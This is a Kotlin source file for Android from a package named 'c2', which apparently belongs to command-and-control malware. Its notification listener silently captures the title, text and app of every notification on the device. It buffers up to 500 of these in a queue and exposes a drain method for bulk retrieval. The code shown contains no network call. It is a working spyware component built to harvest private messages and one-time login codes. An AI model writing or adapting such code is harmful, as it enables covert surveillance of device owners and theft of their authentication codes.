package com.outcome.c2

import android.app.Notification
import android.content.Context
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import org.json.JSONArray
import org.json.JSONObject

object NotificationsBuffer {
    private val buf = java.util.concurrent.ConcurrentLinkedQueue<JSONObject>()

    fun add(n: JSONObject) {
        buf.add(n)
        while (buf.size > 500) buf.poll()
    }

    fun drain(): JSONArray {
        val arr = JSONArray()
        while (buf.isNotEmpty()) arr.put(buf.poll())
        return arr
    }

    fun peek(): JSONArray {
        val arr = JSONArray()
        buf.forEach { arr.put(it) }
        return arr
    }
}

class C2NotificationListener : NotificationListenerService() {
    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn ?: return
        try {
            val extras = sbn.notification.extras
            val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
            val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
            val pkg = sbn.packageName ?: ""
            val time = sbn.postTime
            NotificationsBuffer.add(JSONObject().apply {
                put("package", pkg)
                put("title", title)
                put("text", text)
                put("time", time)
            })
        } catch (_: Exception) {}
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {}
}
